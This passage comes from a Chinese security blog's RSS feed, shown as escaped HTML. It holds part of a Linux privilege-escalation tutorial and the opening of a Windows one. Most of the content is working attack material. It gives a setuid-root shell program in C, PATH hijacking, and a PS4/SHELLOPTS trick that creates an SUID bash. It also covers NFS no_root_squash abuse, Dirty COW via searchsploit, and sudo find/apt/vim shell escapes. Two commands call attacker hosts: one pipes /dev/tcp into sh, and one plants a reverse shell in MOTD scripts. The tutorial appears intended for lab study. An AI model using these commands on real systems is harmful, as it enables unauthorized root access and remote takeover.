&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;sys/types.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;unistd.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token function&#34;&gt;setgid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token function&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/bin/bash -p&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;更改临时环境便变量让程序执行时首先查找 /home/kali/hc 目录下有没有 shell&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;&lt;span class=&#34;token environment constant&#34;&gt;PATH&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;/home/kali/hc:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali/hc&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240225152031452.png&#34; alt=&#34;image-20240225152031452&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;suid-滥用shell功能提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-滥用shell功能提权&#34;&gt;#&lt;/a&gt; SUID - 滥用 shell 功能提权&lt;/h4&gt;
&lt;p&gt;查看 bash 版本在 bash 版本低于 4.4 的时候用&lt;/p&gt;
&lt;p&gt;&lt;code&gt;env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#39; /usr/local/bin/suid4&lt;/code&gt;  进行提权&lt;/p&gt;
&lt;p&gt;原理为：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;env -i&lt;/code&gt; ：这个命令用于运行一个程序，在一个新的、空的环境中。也就是说，它不会继承任何环境变量。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SHELLOPTS=xtrace&lt;/code&gt; ：这个环境变量设置 Bash shell 进入追踪模式（xtrace），在这种模式下，Bash 会打印出执行的每一条命令。&lt;/p&gt;
&lt;p&gt;然后用 PS4 配合 xtrace 提权 PS4 是一个环境变量这个环境变量设置了 Bash shell 在打印追踪信息时使用的提示符&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;默认&lt;span class=&#34;token environment constant&#34;&gt;PS4&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;`&lt;/span&gt; 的值设置为 &lt;span class=&#34;token variable&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;+&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;也就是我们打开xtrace模式打印出来的命令前面的+号&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;例如：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;&lt;span class=&#34;token environment constant&#34;&gt;PS4&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Line $&amp;#123;LINENO&amp;#125;: &#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-x&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Hello, world!&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;运行这个脚本，你会看到：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Line &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;: &lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; Hello, world&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Hello, world&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;PS4=&#39;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#39;&lt;/code&gt; ：我们把他替换为了 &lt;code&gt;&#39;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#39;&lt;/code&gt;  这些命令复制  &lt;code&gt;/bin/bash&lt;/code&gt;  到  &lt;code&gt;/tmp/rootbash&lt;/code&gt; ，并给予新文件 SUID 权限。这意味着任何用户运行  &lt;code&gt;/tmp/rootbash&lt;/code&gt;  时，都会以文件所有者（在这种情况下是 root）的权限来运行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/local/bin/suid4&lt;/code&gt; ：这是要以新环境运行的程序。一个有 s 位的程序，由于  &lt;code&gt;SHELLOPTS&lt;/code&gt;  和  &lt;code&gt;PS4&lt;/code&gt;  的设置，它会在运行时执行  &lt;code&gt;PS4&lt;/code&gt;  中的命令也就是复制出一个具有 root 权限的 bash shell 到 /tmp&lt;/p&gt;
&lt;p&gt;然后我们运行 &lt;code&gt;rootbash -p&lt;/code&gt;  即可获得 root 权限的 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240225180540986.png&#34; alt=&#34;image-20240225180540986&#34;&gt;&lt;/p&gt;
&lt;p&gt;可看到运行后生成了 rootbash 获取了 root&lt;/p&gt;
&lt;p&gt;当然可以将  &lt;code&gt;PS4&lt;/code&gt;  中的命令替换为任何有效的 Bash 命令。因为  &lt;code&gt;PS4&lt;/code&gt;  变量的值会在每次打印追踪信息之前被执行。所以你可以在  &lt;code&gt;PS4&lt;/code&gt;  中插入任何你想要在每次命令执行之前运行的代码。&lt;/p&gt;
&lt;h3 id=&#34;nsf提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nsf提权&#34;&gt;#&lt;/a&gt; NSF 提权&lt;/h3&gt;
&lt;p&gt;nsf 是 Linux 系统中用于共享文件和目录的功能通过 NFS，用户和程序可以访问远程系统上的文件，就像访问本地文件一样&lt;/p&gt;
&lt;p&gt;nsf 的配置在 /etc/exports 文件中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226133638600.png&#34; alt=&#34;image-20240226133638600&#34;&gt;&lt;/p&gt;
&lt;p&gt;这行表示共享  &lt;code&gt;/tmp&lt;/code&gt;  目录，所有的网络主机都可以访问（由  &lt;code&gt;*&lt;/code&gt;  表示），有读写权限（由  &lt;code&gt;rw&lt;/code&gt;  表示），共享将立即写入磁盘就是立即生效（由  &lt;code&gt;sync&lt;/code&gt;  表示），  &lt;code&gt;insecure&lt;/code&gt;  允许非保留端口连接 ，禁止 root 权限映射（由  &lt;code&gt;no_root_squash&lt;/code&gt;  表示），并且不检查子目录的权限（由  &lt;code&gt;no_subtree_check&lt;/code&gt;  表示）。&lt;/p&gt;
&lt;p&gt;特别是有 no_root_squash 启用  &lt;code&gt;no_root_squash&lt;/code&gt;  会使得 root 在 NFS 客户端上拥有和服务器上相同的权限&lt;/p&gt;
&lt;p&gt;利用：&lt;/p&gt;
&lt;p&gt;创建一个目录进行挂载&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mkdir /home/kali/hc/nfs-shell&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mount -o rw,vers=3 192.168.1.144:/tmp /home/kali/hc/nfs-shell&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;rw 读写权限，vers3 版本&lt;/p&gt;
&lt;p&gt;成功挂载&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226142439658.png&#34; alt=&#34;image-20240226142439658&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来写一个提权程序&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vim shell.c&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;unistd.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token function&#34;&gt;setgid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token function&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/bin/bash -p&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;编译然后给 shell 执行权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226145826134.png&#34; alt=&#34;image-20240226145826134&#34;&gt;&lt;/p&gt;
&lt;p&gt;回到受害机执行提权到 root&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226170226574.png&#34; alt=&#34;image-20240226170226574&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;内核提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内核提权&#34;&gt;#&lt;/a&gt; 内核提权&lt;/h3&gt;
&lt;p&gt;查看内核版本 &lt;code&gt;uname -a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;下载 linpeas 脚本收集信息&lt;/p&gt;
&lt;p&gt;如果没有 curl 可以用 kali 下载 nc 传过来&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;kali： &lt;code&gt;nc -lvnp 80 &amp;lt; linpeas.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;受害： &lt;code&gt;cat &amp;lt; /dev/tcp/192.168.1.145/80 | sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226191302928.png&#34; alt=&#34;image-20240226191302928&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;脏牛提权cve-2016-5195&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脏牛提权cve-2016-5195&#34;&gt;#&lt;/a&gt; 脏牛提权 (CVE-2016-5195)&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;searchsploit&lt;/code&gt;  搜索脏牛&lt;/p&gt;
&lt;p&gt;​	&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226192506760.png&#34; alt=&#34;image-20240226192506760&#34;&gt;&lt;/p&gt;
&lt;p&gt;有这些漏洞利用脚本下一个&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchsploit -m 40839.c&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;传到受害查看说明&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226192639018.png&#34; alt=&#34;image-20240226192639018&#34;&gt;&lt;/p&gt;
&lt;p&gt;要用 - pthread 和 - lcrypt 编译编译好后执行然后输入新的密码就可以了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226193427616.png&#34; alt=&#34;image-20240226193427616&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;motd机制提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#motd机制提权&#34;&gt;#&lt;/a&gt; MOTD 机制提权&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226195723017.png&#34; alt=&#34;image-20240226195723017&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;update-motd.d&lt;/code&gt;  目录下的脚本在用户通过 SSH 登录时会被执行，用于生成登录后的欢迎信息这些脚本通常以 root 权限运行&lt;/p&gt;
&lt;p&gt;&lt;code&gt;00-header&lt;/code&gt;  是  &lt;code&gt;update-motd.d&lt;/code&gt;  目录下的一个脚本如果一个用户对  &lt;code&gt;00-header&lt;/code&gt;  文件有写权限，那么他们就可以修改这个文件，插入一些恶意代码例如，他们可以添加一个修改 root 用户密码的命令或者反弹 shell 当其他用户通过 SSH 登录时， &lt;code&gt;00-header&lt;/code&gt;  脚本会以 root 权限运行，执行其中的命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vim &lt;/code&gt; 输入 &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.145/4444 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;kali 监听 &lt;code&gt;nc -lvnp 4444&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;再重新 ssh 登陆让他执行这个脚本，成功拿到 root&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226200442064.png&#34; alt=&#34;image-20240226200442064&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;sudo提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudo提权&#34;&gt;#&lt;/a&gt; sudo 提权&lt;/h3&gt;
&lt;h4 id=&#34;sudofind-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudofind-提权&#34;&gt;#&lt;/a&gt; sudofind 提权&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-exec&lt;/span&gt; /bin/sh &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-quit&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301183010100.png&#34; alt=&#34;image-20240301183010100&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;sudoapt提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudoapt提权&#34;&gt;#&lt;/a&gt; sudoapt 提权&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;apt&lt;/span&gt; update &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; APT::Update::Pre-Invoke::&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;/bin/sh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301183347295.png&#34; alt=&#34;image-20240301183347295&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;sudovim提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudovim提权&#34;&gt;#&lt;/a&gt; sudovim 提权&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;vim&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;:!/bin/sh&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301193448209.png&#34; alt=&#34;image-20240301193448209&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;gtfobins&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gtfobins&#34;&gt;#&lt;/a&gt; GTFOBins&lt;/h3&gt;
&lt;p&gt;这个网站可以搜索更多 sudo suid 提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301201128501.png&#34; alt=&#34;image-20240301201128501&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301201241369.png&#34; alt=&#34;image-20240301201241369&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/</guid>
            <title>Windows提权</title>
            <link>http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/</link>
            <pubDate>Thu, 09 Nov 2023 20:28:50 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;提权基础&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提权基础&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;提权基础&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;获取 webshell 后一般都是 www-data 权限权限很低所以要进行提权把权限提高为了后续渗透顺利&lt;/p&gt;
&lt;p&gt;windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权 ftp 提权 令牌窃取提权等姿势。&lt;/p&gt;
